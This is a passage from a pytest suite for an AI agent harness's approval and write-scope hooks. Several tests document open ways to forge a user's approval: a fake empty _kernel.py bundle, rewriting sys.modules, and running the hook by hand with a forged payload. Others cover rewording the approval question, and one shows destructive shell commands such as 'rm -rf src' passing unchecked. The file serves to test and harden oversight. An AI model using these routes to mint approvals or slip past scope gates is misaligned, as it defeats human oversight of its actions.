    without the code and free text both meant yes to the person who typed them."""
    state, pr, request, question = pending(tmp_path)
    declines = approvals.declining_labels(request)
    assert declines, "a request whose question offers no way to decline is a different bug"

    for label in declines:
        result = run_approval(tmp_path, answered(tmp_path, question, label))
        assert result.returncode == 0
        assert result.stdout == "", (label, result.stdout)

    for answer in ("Freigeben", "ok passt", approvals.approve_label(request["mint_code"]) + " ",
                   [approvals.approve_label(request["mint_code"])]):
        result = run_approval(tmp_path, answered(tmp_path, question, answer))
        assert result.returncode == 0
        assert to_user(result), "%r minted nothing and said nothing" % (answer,)
    assert state.read_item(pr["id"])["approval_ref"] is None


def _kernel_clone(tmp_path, old, new):
    """A kernel beside the shipped one with ONE line changed — the only way to measure a claim
    about a DERIVATION, since both sides of a derived assertion move together by construction."""
    clone = tmp_path / "kernel-clone"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(clone / "kernel"))
    path = clone / "kernel" / "approvals.py"
    source = path.read_text(encoding="utf-8")
    assert source.count(old) == 1, source.count(old)
    path.write_text(source.replace(old, new), encoding="utf-8")
    return clone


def _question_of(clone, state, request_id):
    """`build_question` AS THE CLONE RUNS IT — a hand-built copy would differ from what the hook
    rebuilds for its own comparison, and the test would then measure the mismatch branch."""
    script = ("import json, sys; sys.path.insert(0, %r)\n"
              "from kernel.approvals import build_question, pending_request\n"
              "from kernel.state import ProjectState\n"
              "print(json.dumps(build_question(pending_request(ProjectState(%r), %r))))\n"
              % (str(clone), state.root, request_id))
    result = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True,
                            timeout=120)
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def test_a_renamed_decline_option_needs_no_second_edit(tmp_path):
    """`declining_labels` claims it READS the question's options. Measured against a kernel that
    renames one of them, because nothing else can tell a derivation from an enumeration.

    The trap this closes: every other test here builds its expectation with `declining_labels`
    itself, so replacing that function's body with `(_CHANGE_LABEL, _REJECT_LABEL)` kept the whole
    set green — both sides moved together. Here the QUESTION renames its middle option and the two
    constants do not, so the derived reader stays quiet on the renamed click and an enumerated one
    would announce it."""
    state, pr, request, _question = pending(tmp_path)
    clone = _kernel_clone(tmp_path, '"label": _CHANGE_LABEL,', '"label": "Anders machen",')
    question = _question_of(clone, state, request["request_id"])
    renamed = [option["label"] for option in question["options"]][1]
    assert renamed == "Anders machen", question["options"]

    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=str(clone))
    result = subprocess.run([sys.executable, os.path.join(HOOKS, "gate_approval.py")],
                            input=json.dumps(answered(tmp_path, question, renamed)),
                            capture_output=True, text=True, env=env, timeout=120)

    assert result.returncode == 0, result.stderr
    assert result.stdout == "", (
        "a decline the kernel's own question offers was announced as a lost approval — "
        "`declining_labels` is reading something other than that question: %s" % result.stdout)
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_an_expired_request_is_not_open_and_a_reworded_relay_goes_silent(tmp_path):
    """Both ends of `open_requests`' TTL claim, and the residue it leaves, in one place.

    END ONE: the pending FILE is still on disk and `open_requests` does not return it, because it
    asks `pending_request`, which refuses an expired request. END TWO: the hook's trigger is built
    on exactly that answer, so a reworded relay after the clock ran out is silent again — no
    notice, no stderr, no audit line.

    THE RESIDUE, written here because it is the price of the definition and not a bug in it: an
    approval request lives 24 h (`create_pending_request`'s default `ttl_seconds`). Past that, a
    user who clicks yes on a relay in the model's own words is back in BUG-0039's silence. It is
    not a chain that runs inside one session, which is why it is recorded rather than closed — and
    the kernel's OWN question still speaks past the clock, which is where the residue stops; the
    last assertion holds that boundary."""
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    request = approvals.create_pending_request(state, "scope", pr["id"], ttl_seconds=0.01)
    question = approvals.build_question(request)
    time.sleep(0.05)

    assert os.path.exists(approvals._request_path(state, request["request_id"]))
    assert approvals.open_requests(state) == []

    own_words = {"question": "Soll ich das jetzt freigeben?", "header": "Freigabe",
                 "multiSelect": False,
                 "options": [{"label": "Ja, freigeben", "description": "los"},
                             {"label": "Nein", "description": "noch nicht"}]}
    silent = run_approval(tmp_path, answered(tmp_path, own_words, "Ja, freigeben"))
    assert silent.returncode == 0
    assert silent.stdout == ""
    assert silent.stderr == ""
    assert audit_notes(tmp_path) == []

    still_spoken = run_approval(tmp_path, answered(
        tmp_path, question, approvals.approve_label(request["mint_code"])))
    assert "abgelaufen" in to_user(still_spoken), to_user(still_spoken)
    assert state.read_item(pr["id"])["approval_ref"] is None


def _refusal_variants(tmp_path):
    """One payload per way an ASSENTING answer can fail to mint — each built from the running
    kernel, never from a hard-coded string. Returns {name: (state, pr, payload)}."""
    variants = {}

    state, pr, request, question = pending(tmp_path / "unmarked")
    plain = dict(question, question="Bitte gib das frei.")
    variants["unmarked"] = (state, pr, answered(tmp_path / "unmarked", plain,
                                                approvals.approve_label(request["mint_code"])))

    state, pr, request, question = pending(tmp_path / "reworded")
    tampered = dict(question, question="Kurz erklärt: " + question["question"])
    variants["reworded"] = (state, pr, answered(tmp_path / "reworded", tampered,
                                                approvals.approve_label(request["mint_code"]),
                                                echo=tampered))

    state, pr, request, question = pending(tmp_path / "stale")
    fresh = approvals.create_pending_request(state, "scope", pr["id"])
    variants["stale_code"] = (state, pr, answered(
        tmp_path / "stale", approvals.build_question(fresh),
        approvals.approve_label(request["mint_code"])))

    root = tmp_path / "expired"
    state = ProjectState(str(root / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    request = approvals.create_pending_request(state, "scope", pr["id"], ttl_seconds=0.01)
    time.sleep(0.05)
    variants["expired"] = (state, pr, answered(root, approvals.build_question(request),
                                               approvals.approve_label(request["mint_code"])))

    state, pr, request, question = pending(tmp_path / "noecho")
    payload = ask(tmp_path / "noecho", question, event="PostToolUse",
                  tool_response={"answers": {
                      question["question"]: approvals.approve_label(request["mint_code"])}})
    variants["no_echo"] = (state, pr, payload)

    state, pr, request, question = pending(tmp_path / "batch")
    other = {"question": "Welche Farbe?", "header": "Design", "multiSelect": False,
             "options": [{"label": "Petrol", "description": "kuehl"}]}
    payload = ask(tmp_path / "batch", question, event="PostToolUse",
                  tool_response={"answers": {
                      question["question"]: approvals.approve_label(request["mint_code"]),
                      other["question"]: "Petrol"},
                      "questions": [question, other]})
    variants["batched"] = (state, pr, payload)
    return variants


def test_each_refusal_reason_gets_its_own_sentence_for_the_user(tmp_path):
    """The TSK-0057/BUG-0036 discipline, applied here: ONE blanket sentence for every non-mint
    would send a user whose request expired back to re-ask a question that can no longer mint.

    Measured as a property rather than asserted per string: every variant speaks, every message
    ends in one of the kernel's two honest exits, and no two variants say the same thing."""
    variants = _refusal_variants(tmp_path)
    messages = {}
    for name, (state, pr, payload) in sorted(variants.items()):
        result = run_approval(os.path.dirname(state.root), payload)
        assert result.returncode == 0, (name, result.stderr)
        assert state.read_item(pr["id"])["approval_ref"] is None, name
        message = to_user(result)
        assert message, "%s said nothing to the user" % name
        assert (message.endswith(approvals.NEXT_ASK_AGAIN)
                or message.endswith(approvals.NEXT_START_OVER)), (name, message)
        messages[name] = message
    assert len(set(messages.values())) == len(messages), messages


def test_a_second_click_on_an_already_minted_question_does_not_alarm_the_user(tmp_path):
    """The other direction of the same rule: an over-alarming message is as wrong as the silence.

    Replaying the answer after a successful mint finds no PENDING request — and a blanket "no
    approval was created, start over" there tells a user whose yes IS recorded that it is not."""
    state, pr, request, question = pending(tmp_path)
    payload = answered(tmp_path, question, approvals.approve_label(request["mint_code"]))
    assert run_approval(tmp_path, payload).returncode == 0
    apr_id = state.read_item(pr["id"])["approval_ref"]
    assert apr_id is not None

    again = run_approval(tmp_path, payload)
    message = to_user(again)
    assert apr_id in message, message
    assert "bereits erteilt" in message
    assert approvals.NEXT_START_OVER not in message
    assert state.read_item(pr["id"])["approval_ref"] == apr_id


def _approval_calls_of_the_hook():
    """The `approvals.<name>` calls the shipped approval hook really makes — parsed, not searched."""
    with io.open(os.path.join(HOOKS, "gate_approval.py"), encoding="utf-8") as handle:
        tree = ast.parse(handle.read(), "gate_approval.py")
    return {node.attr for node in ast.walk(tree)
            if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name)
            and node.value.id == "approvals"}


def test_every_approval_refusal_the_hook_can_surface_speaks_to_the_user():
    """Every `ApprovalError` the approval hook can put in front of a user carries `user_text`.

    DERIVED FROM BOTH RUNNING FILES, never from a list kept beside them: the reachable set is the
    hook's own `approvals.<name>` calls, closed transitively over the kernel functions those call.
    A branch added to `mint` tomorrow is therefore in scope the day it ships, and one that forgets
    its sentence for the user fails here instead of falling back to `_user_text_of`'s last resort.
    """
    with io.open(os.path.join(TEAM_KITS, "kernel", "approvals.py"), encoding="utf-8") as handle:
        module = ast.parse(handle.read(), "approvals.py")
    functions = {node.name: node for node in module.body if isinstance(node, ast.FunctionDef)}
    reachable, todo = set(), [name for name in _approval_calls_of_the_hook() if name in functions]
    assert todo, "the hook calls no kernel approval function — this test would prove nothing"
    while todo:
        name = todo.pop()
        if name in reachable:
            continue
        reachable.add(name)
        todo += [node.func.id for node in ast.walk(functions[name])
                 if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
                 and node.func.id in functions]
    silent = [(name, node.lineno)
              for name in sorted(reachable)
              for node in ast.walk(functions[name])
              if isinstance(node, ast.Raise) and isinstance(node.exc, ast.Call)
              and getattr(node.exc.func, "id", "") == "ApprovalError"
              and not any(keyword.arg == "user_text" for keyword in node.exc.keywords)]
    assert not silent, "ApprovalError without a sentence for the user: %s" % silent
    assert len(reachable) > 1, reachable


def test_every_non_minting_exit_of_the_approval_hook_carries_a_user_sentence():
    """Each `_report` call in the shipped hook passes BOTH halves — the role's line and the user's.

    ARITY IS NOT ENOUGH, and this test used to check only that: `_report(message, "")` satisfied a
    count and delivers nothing, which is the defect wearing the fix's shape. A second argument that
    is a CONSTANT is therefore read and must be non-empty; anything computed (a name, a call, a
    concatenation) is left to the runtime tests above, which is where "is the sentence any good"
    belongs."""
    with io.open(os.path.join(HOOKS, "gate_approval.py"), encoding="utf-8") as handle:
        tree = ast.parse(handle.read(), "gate_approval.py")
    calls = [node for node in ast.walk(tree)
             if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
             and node.func.id == "_report"]
    assert len(calls) >= 6, len(calls)
    sentences = {}
    for call in calls:
        given = list(call.args[1:]) + [kw.value for kw in call.keywords if kw.arg == "user_text"]
        sentences[call.lineno] = given[0] if given else None
    missing = sorted(line for line, node in sentences.items() if node is None)
    assert not missing, "_report call without a user sentence at line(s) %s" % missing
    empty = sorted(line for line, node in sentences.items()
                   if isinstance(node, ast.Constant) and not str(node.value or "").strip())
    assert not empty, "_report call whose user sentence is an empty constant, line(s) %s" % empty


def test_the_transcript_key_is_understood_too(tmp_path):
    """The hook payload calls it `tool_response`, the transcript `toolUseResult`; a gate knowing
    only one of them would silently never mint."""
    state, pr, request, question = pending(tmp_path)
    payload = ask(tmp_path, question, event="PostToolUse",
                  toolUseResult={"answers": {
                      question["question"]: approvals.approve_label(request["mint_code"])},
                      "questions": [question]})
    assert run_approval(tmp_path, payload).returncode == 0
    assert state.read_item(pr["id"])["approval_ref"] is not None


def test_an_expired_request_mints_nothing(tmp_path):
    import time as timemodule
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    request = approvals.create_pending_request(state, "scope", pr["id"], ttl_seconds=0.01)
    question = approvals.build_question(request)
    timemodule.sleep(0.05)
    result = run_approval(tmp_path, answered(
        tmp_path, question, approvals.approve_label(request["mint_code"])))
    assert result.returncode == 0
    assert "expired" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def _forge_script(tmp_path, state, request, body):
    script = tmp_path / "forge.py"
    write(str(script),
          "import sys\n"
          "sys.path.insert(0, %r)\n"
          "STATE = %r\n"
          "RID = %r\n"
          "CODE = %r\n"
          "HOOKS = %r\n" % (TEAM_KITS, state.root, request["request_id"],
                            request["mint_code"], HOOKS) + body)
    return subprocess.run([sys.executable, str(script)], capture_output=True, text=True,
                          timeout=120, cwd=str(tmp_path))


def test_a_plain_import_of_mint_is_refused(tmp_path):
    """User condition (i), 2026-07-25: `mint` is a plain function and the pending file is readable
    project state, so without a caller check anything could pass the label it found there."""
    state, pr, request, _question = pending(tmp_path)
    result = _forge_script(tmp_path, state, request,
                           "from kernel.approvals import mint, approve_label\n"
                           "from kernel.state import ProjectState\n"
                           "mint(ProjectState(STATE), RID, approve_label(CODE))\n")
    assert result.returncode != 0
    assert "no hook bridge loaded" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_a_crafted_source_filename_is_refused(tmp_path):
    """`compile(src, "<the real hook path>", "exec")` makes the caller frame LOOK like the hook
    without writing anything — which is why the entry point is checked as well as the frame."""
    state, pr, request, _question = pending(tmp_path)
    result = _forge_script(
        tmp_path, state, request,
        "import os\n"
        "sys.path.insert(0, HOOKS)\n"
        "import _kernel\n"
        "from kernel.approvals import mint, approve_label\n"
        "from kernel.state import ProjectState\n"
        "src = 'mint(ProjectState(STATE), RID, approve_label(CODE))'\n"
        "code = compile(src, os.path.join(HOOKS, 'gate_approval.py'), 'exec')\n"
        "exec(code, {'mint': mint, 'approve_label': approve_label,\n"
        "            'ProjectState': ProjectState, 'STATE': STATE, 'RID': RID, 'CODE': CODE})\n")
    assert result.returncode != 0
    assert "was refused" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_importing_the_hook_and_calling_its_handler_is_refused(tmp_path):
    """The shipped hook, imported as a module: the frame is genuine, the ENTRY POINT is not."""
    state, pr, request, question = pending(tmp_path)
    payload = answered(tmp_path, question, approvals.approve_label(request["mint_code"]))
    result = _forge_script(
        tmp_path, state, request,
        "import json\n"
        "sys.path.insert(0, HOOKS)\n"
        "import gate_approval\n"
        "try:\n"
        "    gate_approval.handle_post_tool_use(json.loads(%r))\n"
        "except SystemExit:\n"
        "    pass\n" % json.dumps(payload))
    assert state.read_item(pr["id"])["approval_ref"] is None, result.stderr


def _fake_bundle(tmp_path, state, request, extra=""):
    """Two files: any script named gate_approval.py, plus an EMPTY _kernel.py beside it."""
    fake = tmp_path / "fake"
    write(str(fake / "_kernel.py"), "")
    write(str(fake / "gate_approval.py"),
          "import os, sys\n"
          "sys.path.insert(0, %r)\n" % TEAM_KITS
          + extra
          + "from kernel.approvals import mint, approve_label\n"
            "from kernel.state import ProjectState\n"
            "mint(ProjectState(%r), %r, approve_label(%r))\n"
            % (state.root, request["request_id"], request["mint_code"]))
    return subprocess.run([sys.executable, str(fake / "gate_approval.py")],
                          capture_output=True, text=True, timeout=120)


def test_a_same_named_script_without_a_loaded_bridge_is_refused(tmp_path):
    """The lazy version of the fake bundle: a `_kernel.py` on disk is not a bridge in memory."""
    state, pr, request, _question = pending(tmp_path)
    result = _fake_bundle(tmp_path, state, request)
    assert result.returncode != 0
    assert "no hook bridge loaded" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


@pytest.mark.known_hole("approval_provenance")
def test_two_trivial_files_defeat_the_caller_check(tmp_path):
    """KNOWN OPEN PATH, asserted rather than implied.

    Importing the EMPTY `_kernel.py` next to it makes the fake bundle pass all three conditions:
    the accepted hook path is derived from that fake bridge, and both the frame and `__main__` are
    the fake hook. So the residual is "any directory containing a file named `_kernel.py`, empty is
    enough" — NOT "a copy of the whole bundle". `.claude/hooks/**` being Edit/Write-protected buys
    nothing here, because any other directory works.

    STATUS after step 4, measured: there is no `hooks/`-segment rule any more. `gate_write_scope`
    refuses a shell pipeline that NAMES a protected tree (`.claude`, `.codex`, `.agents/skills`,
    `.github/hooks`, `.github/agents`, `team-kits`) outside a read-only command — so BUILDING this
    fake bundle from the shipped one is refused. But `python fake/gate_approval.py`, where the two
    files were authored rather than copied, names nothing protected and is allowed. Closing that
    needs a PERMISSION posture (settings.json denying arbitrary python), not more hook logic. This
    test calls the script directly, i.e. it measures the KERNEL's own defence, which is none."""
    state, pr, request, _question = pending(tmp_path)
    result = _fake_bundle(
        tmp_path, state, request,
        "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
        "import _kernel  # a 0-byte _kernel.py is still a module\n")
    assert result.returncode == 0, result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is not None


@pytest.mark.known_hole("approval_provenance")
def test_rewriting_sys_modules_defeats_the_caller_check(tmp_path):
    """KNOWN OPEN PATH, asserted rather than implied.

    Every input the caller check reads is in-process state the caller may rewrite: a synthetic
    `_kernel` module whose `__file__` points at a path that need not exist, plus an assignment to
    `sys.modules["__main__"].__file__`. This is the CHEAPEST forgery — it never runs the hook, so
    it leaves no audit note at all. It is why condition (i) cannot be established by library code:
    in-process state cannot vouch for in-process state.

    STATUS after step 4: unchanged by any hook, because no command line reveals it. Only a
    permission posture that stops arbitrary python execution closes it."""
    state, pr, request, _question = pending(tmp_path)
    nowhere = os.path.join(str(tmp_path), "nowhere")
    result = _forge_script(
        tmp_path, state, request,
        "import types\n"
        "from kernel.approvals import mint, approve_label\n"
        "from kernel.state import ProjectState\n"
        "bridge = types.ModuleType('_kernel')\n"
        "bridge.__file__ = %r\n"
        "sys.modules['_kernel'] = bridge\n"
        "sys.modules['__main__'].__file__ = %r\n"
        "code = compile('mint(ProjectState(STATE), RID, approve_label(CODE))', %r, 'exec')\n"
        "exec(code, {'mint': mint, 'approve_label': approve_label,\n"
        "            'ProjectState': ProjectState, 'STATE': STATE, 'RID': RID, 'CODE': CODE})\n"
        % (os.path.join(nowhere, "_kernel.py"),
           os.path.join(nowhere, "gate_approval.py"),
           os.path.join(nowhere, "gate_approval.py")))
    assert result.returncode == 0, result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is not None


@pytest.mark.known_hole("approval_provenance")
def test_running_the_shipped_hook_by_hand_still_mints(tmp_path):
    """KNOWN OPEN PATH, asserted rather than implied — this test documents a hole, not a guarantee.

    The hook exists to be executed with a payload on stdin, so anyone who can run
    `python <hooks>/gate_approval.py < forged.json` mints, and the forged payload (answers + the
    matching question echo) is assembled from the readable pending request. NOTHING in-process can
    close this: the hook running as the hook is exactly what the caller check looks for.

    STATUS after step 4, measured: through the Bash TOOL, `gate_write_scope` refuses a pipeline
    that names any protected tree outside a read-only command — which covers running the hook,
    copying it out (`cp -r .claude kk`), piping it out (`cat <hook> | tee copy`) and deleting it
    (`ls .claude/hooks/*.py | xargs rm`). What it cannot cover is a bundle the agent AUTHORED at an
    ordinary path, or a payload delivered through a file it may legitimately write. This test
    invokes the hook directly, so it measures what the KERNEL can defend on its own — nothing —
    which is why `approval_provenance` stays `unverified` until `python scripts/harness.py doctor` can also see a
    permission posture that prevents arbitrary execution."""
    state, pr, request, question = pending(tmp_path)
    payload = answered(tmp_path, question, approvals.approve_label(request["mint_code"]))
    assert run_approval(tmp_path, payload).returncode == 0
    assert state.read_item(pr["id"])["approval_ref"] is not None


def test_the_platform_may_omit_multiselect_from_its_echo(tmp_path):
    """Measured against 37 real toolUseResult blobs (Claude Code 2.1.195-2.1.219): the platform
    drops `multiSelect: false` from its question echo in 15 of them. Demanding the key would refuse
    ~40% of GENUINE approvals, so the tolerance is deliberate and pinned here — a later
    "tighten the comparison" edit is one line away from breaking production while the suite stays
    green."""
    state, pr, request, question = pending(tmp_path)
    normalised = {k: v for k, v in question.items() if k != "multiSelect"}
    payload = answered(tmp_path, question, approvals.approve_label(request["mint_code"]),
                       echo=normalised)
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0, result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is not None


def test_a_decoy_echo_does_not_launder_a_tampered_question(tmp_path):
    """The echo is matched by the ANSWERED text, never by the marker.

    ONE answer, ONE echoed question — deliberately, so the batch rule cannot do this test's work.
    A [pristine, tampered] payload is refused by the batch check FIRST, which means such a test
    stays green even with the marker-matching bug restored (proven by mutation); here the
    text-keyed lookup is the only thing that can refuse."""
    state, pr, request, question = pending(tmp_path)
    tampered = dict(question, question=question["question"].replace(
        "Freigabe erbeten", "Routinebestaetigung (unkritisch)"))
    payload = {"hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion",
               "cwd": str(tmp_path), "tool_input": {"questions": [tampered]},
               "tool_response": {
                   "answers": {tampered["question"]: approvals.approve_label(
                       request["mint_code"])},
                   "questions": [question]}}
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0
    assert "does not contain the question that was answered" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_a_pristine_decoy_alongside_a_tampered_question_is_refused_as_a_batch(tmp_path):
    """The same attack in its bundled shape — refused one rule earlier, pinned separately so the
    two rules are not each other's only test."""
    state, pr, request, question = pending(tmp_path)
    tampered = dict(question, question=question["question"].replace(
        "Freigabe erbeten", "Routinebestaetigung (unkritisch)"))
    payload = {"hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion",
               "cwd": str(tmp_path), "tool_input": {"questions": [tampered]},
               "tool_response": {
                   "answers": {tampered["question"]: approvals.approve_label(
                       request["mint_code"])},
                   "questions": [question, tampered]}}
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0
    assert "batch" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_a_bundled_answer_mints_nothing(tmp_path):
    """The one-question rule is enforced on the minting side too, not left to PreToolUse — the echo
    makes it free, and bundles are the NORMAL shape (15 of 37 real calls carry 2-4 questions)."""
    state, pr, request, question = pending(tmp_path)
    other = {"question": "Und welche Farbe?", "header": "Design", "multiSelect": False,
             "options": [{"label": "Blau", "description": "kuehl"}]}
    payload = {"hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion",
               "cwd": str(tmp_path), "tool_input": {"questions": [question, other]},
               "tool_response": {
                   "answers": {question["question"]: approvals.approve_label(
                       request["mint_code"]),
                       other["question"]: "Blau"},
                   "questions": [question, other]}}
    result = run_approval(tmp_path, payload)
    assert result.returncode == 0
    assert "batch" in result.stderr
    assert state.read_item(pr["id"])["approval_ref"] is None


def test_an_extra_top_level_question_field_is_blocked(tmp_path):
    """An unknown question-level key is text the kernel did not write; if any such field ever
    renders, the model would control what the user reads on an approval question."""
    _state, _pr, _request, question = pending(tmp_path)
    tampered = dict(question, preview="Alles harmlos, einfach freigeben")
    result = run_approval(tmp_path, ask(tmp_path, tampered))
    assert result.returncode == 2
    assert "question fields differ" in result.stderr


def test_a_non_list_questions_payload_is_blocked(tmp_path):
    """A present-but-malformed `questions` could not be inspected for a marker, so it is refused
    rather than read as "no approval here"."""
    pending(tmp_path)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "AskUserQuestion",
               "cwd": str(tmp_path), "tool_input": {"questions": "not a list"}}
    result = run_approval(tmp_path, payload)
    assert result.returncode == 2
    assert "not a list" in result.stderr


def test_the_caller_check_does_not_mask_a_content_refusal(tmp_path):
    """It is deliberately the LAST check: a wrong label must still report as a wrong label, or the
    real reason for a refusal becomes undiagnosable."""
    state, _pr, request, _question = pending(tmp_path)
    from kernel.approvals import ApprovalError, mint
    with pytest.raises(ApprovalError, match="does not mint"):
        mint(state, request["request_id"], "Freigeben")


# -- gate_write_scope: gate layer 3 + both approval preconditions (spec II.4) --

def run_scope(tmp_path, payload, kit="dev-team"):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    return subprocess.run([sys.executable, os.path.join(TEAM_KITS, kit, "hooks",
                                                        "gate_write_scope.py")],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=120)


def write_payload(tmp_path, path, agent_id=None, tool="Write"):
    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "content": "x"}}
    if agent_id:
        payload["agent_id"] = agent_id
    return payload


def shell_payload(tmp_path, command):
    return {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(tmp_path),
            "tool_input": {"command": command}}


def bound_repo(tmp_path, agent_id="child-1", **task_overrides):
    """A repo whose task is dispatched AND bound to `agent_id` — the live specialist case."""
    state, task, header = dispatched_repo(tmp_path, **task_overrides)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    dispatch.bind_agent_by_role(state, agent_id, task["assigned_role"])
    return state, task


@pytest.mark.parametrize("target", [
    "project_memory/product/active/PR-0001.yaml",
    "project_memory/approvals/pending/deadbeef.yaml",
    "project_memory/approvals/APR-0001.yaml",
    "project_memory/tasks/leases/TSK-0001.lease.yaml",
    "project_memory/generated/index.yaml",
])
def test_no_tool_writes_canonical_state(tmp_path, target):
    """spec II.4: the kernel is the ONLY writer. `approvals/pending/**` matters most — it holds
    mint codes, so a writable one forges a user approval with a self-consistent request behind it,
    the one forgery the provenance check cannot detect."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, write_payload(tmp_path, tmp_path / target))
    assert result.returncode == 2
    assert "canonical project state" in result.stderr


def test_the_orchestrator_may_still_write_staging(tmp_path):
    """The lead is not exempt from the canonical-state rule (that is the parametrized case above),
    but spec II.4 does let it write a class-small WFR into staging — so the absolute rule must not
    swallow the one thing the lead legitimately does there."""
    dispatched_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging" / "PR-0001"
                            / "WFR-0001.drawio.svg")
    assert run_scope(tmp_path, payload).returncode == 0


def test_a_specialist_may_write_its_own_staging(tmp_path):
    """staging/ is explicitly NON-canonical (spec II.4 Vorschlagsbereich) — proposals have to be
    writable or the designer cannot work."""
    _state, task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging" / task["id"]
                            / "proposal.html", agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 0


def _bound_routine_auditor(tmp_path, agent_id="auditor-1"):
    """A live auditor: routine-authorised, spawned through the gate, bound to its lease."""
    state, task, header, _apr = routine_dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, spawn_payload(
        tmp_path, header, role="project-auditor")).returncode == 0
    dispatch.bind_agent_by_role(state, agent_id, task["assigned_role"])
    assert dispatch.task_for_agent(state, agent_id)["id"] == task["id"]
    assert state.read_item(task["id"])["allowed_scope"] == []
    return state, task


def test_the_write_tools_refuse_a_routine_tasks_writes_outside_its_own_staging(tmp_path):
    """Half of what `dispatch._claims_writable_scope` rests on, measured against the running gate.

    The routine route refuses a task whose work order claims an `allowed_scope`; what an EMPTY one
    then means is enforced here and only here — `gate_write_scope.handle_file_write` resolves the
    bound task and blocks, while the specialist keeps its own `staging/<task-id>/`, the one
    exception the auditor role is written around. The other half (the shell) is the known hole
    below; the two are separate tests because they have separate answers.
    """
    _state, task = _bound_routine_auditor(tmp_path)
    refused = run_scope(tmp_path, write_payload(tmp_path, tmp_path / "src" / "quickfix.py",
                                                agent_id="auditor-1"))
    assert refused.returncode == 2, refused.stderr
    assert "allowed_scope" in refused.stderr
    allowed = run_scope(tmp_path, write_payload(
        tmp_path, tmp_path / "project_memory" / "staging" / task["id"] / "findings.md",
        agent_id="auditor-1"))
    assert allowed.returncode == 0, allowed.stderr


def _registered_shell_gates(kit="dev-team"):
    """The hooks settings.json really registers for PreToolUse(Bash|PowerShell).

    Read out of the shipped registration, never listed here: which gates a shell command passes is
    a question for `settings.json`, and a test that carried its own list would keep measuring the
    gates it knew about after a ninth one shipped.
    """
    with open(os.path.join(TEAM_KITS, kit, "settings", "settings.json"), encoding="utf-8") as fh:
        settings = json.load(fh)
    names = []
    for group in settings["hooks"]["PreToolUse"]:
        if "Bash" not in (group.get("matcher") or ""):
            continue
        names += [re.findall(r"([a-z_]+\.py)", hook["command"])[-1] for hook in group["hooks"]]
    return names


@pytest.mark.known_hole("state_write_protection.shell")
def test_a_bound_specialists_shell_writes_are_scope_checked_by_nothing(tmp_path):
    """MEASURED OPEN HOLE — gate layer 3 does not exist on the shell path.

    `gate_write_scope`'s own table said "the same two rules, for the shell" and had said it since
    the gate shipped. `handle_shell` never resolves the bound task: it decides on whether the
    command line names the state directory or the enforcement layer, so `allowed_scope` and
    `forbidden_scope` are read by nothing there. A specialist whose work order permits no writes
    at all — the auditor under a routine approval is the case that surfaced it, and every bound
    role has the same shape — writes anywhere outside `project_memory/` through `Bash`.

    THE CAPABILITY is `state_write_protection.shell`, i.e. what `gate_write_scope` protects on the
    shell path; the two holes already filed under it are about the state directory and this one is
    about the task scope, which is the OTHER of that module's two rules. Filed there rather than
    under a new name because the matrix is spec II.8's and widening it is a spec decision.

    Every registered Bash gate is run, and the SANITY case is what makes the rc 0 above mean
    anything: a shell write into canonical state must still block, or the fixture is mis-wired and
    a passing "hole" would only be measuring a broken harness. Invert this test the day the shell
    path reads the bound task.
    """
    _state, _task = _bound_routine_auditor(tmp_path)
    gates = _registered_shell_gates()
    assert len(gates) >= 5, gates

    def rc_by_gate(command):
        payload = dict(shell_payload(tmp_path, command), agent_id="auditor-1")
        return {name: subprocess.run(
            [sys.executable, os.path.join(TEAM_KITS, "dev-team", "hooks", name)],
            input=json.dumps(payload), capture_output=True, text=True,
            env=dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path),
                     HARNESS_KERNEL_PATH=TEAM_KITS), timeout=120).returncode
                for name in gates}

    sanity = rc_by_gate("echo x > project_memory/product/active/PR-0001.yaml")
    assert 2 in sanity.values(), (
        "the sanity case did not block — this fixture proves nothing about the cases below: %s"
        % sanity)
    for command in ("echo pwned > src/x.py", "rm -rf src", "git commit -am wip"):
        codes = rc_by_gate(command)
        assert set(codes.values()) == {0}, (command, codes)


# -- gate_write_scope rule 4: ordering work is the orchestrator's act ---------

_ORDERING_REFUSED = (
